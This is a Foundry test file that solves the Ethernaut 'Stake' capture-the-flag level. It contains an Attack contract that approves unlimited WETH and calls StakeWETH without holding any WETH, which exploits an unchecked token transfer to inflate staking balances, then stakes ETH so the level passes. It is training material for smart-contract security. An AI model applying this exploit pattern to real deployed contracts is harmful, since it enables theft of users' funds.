// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Stake/StakeFactory.sol";
import "../src/Ethernaut.sol";

contract StakeTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testStakeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        StakeFactory stakeFactory = new StakeFactory();
        ethernaut.registerLevel(stakeFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(stakeFactory);
        Stake ethernautStake = Stake(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        ethernautStake.StakeETH{value: 1 ether}();
        ethernautStake.Unstake(1 ether);
        Attack attack = new Attack();
        attack.attack{value: 0.002 ether}(address(ethernautStake));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    Stake target;

    function attack(address _target) public payable {
        target = Stake(payable(_target));
        IERC20(address(target.WETH())).approve(address(target), type(uint256).max);
        target.StakeWETH(1 ether);
        target.StakeETH{value: 0.002 ether}();
    }
}
